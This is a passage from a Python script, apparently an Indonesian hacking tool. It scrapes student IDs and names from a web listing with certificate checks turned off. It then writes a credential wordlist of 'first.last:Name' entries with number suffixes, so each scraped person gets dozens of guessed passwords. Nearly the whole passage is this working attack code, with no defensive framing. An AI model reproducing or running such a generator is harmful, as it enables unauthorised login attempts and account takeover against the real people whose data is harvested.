					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'32\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'1\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'2\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'3\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'4\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'5\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'6\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'7\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'8\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'9\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'01\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'02\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'03\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'04\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'05\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'06\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'07\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'08\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'09\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'10\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'11\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'12\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'13\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'14\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'15\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'16\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'17\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'18\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'19\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'20\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'21\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'22\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'23\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'24\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'25\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'26\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'27\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'28\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'29\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'30\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'31\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'32\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'1\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'2\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'3\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'4\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'5\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'6\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'7\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'8\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'9\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'01\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'02\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'03\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'04\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'05\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'06\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'07\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'08\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'09\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'10\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'11\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'12\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'13\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'14\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'15\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'16\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'17\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'18\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'19\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'20\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'21\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'22\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'23\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'24\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'25\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'26\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'27\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'28\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'29\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'30\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'31\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'32\n')
					
			except:
				continue
	else:
			exit()

def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _

def done(_2):
	print(f"\n{B}[{W}!{B}]{W} Wordlist Selesai Dibuat! ")
	print(f"{B}[{W}+{B}]{W} {len(yxc)}{W} Baris Telah Tersimpan Di Memory Internal ")
	print(f"{B}[{W}!{B}]{W} Wordlist Tersimpan Sebagai {B}{_2}")


if __name__ == '__main__':
	
	main()
	
				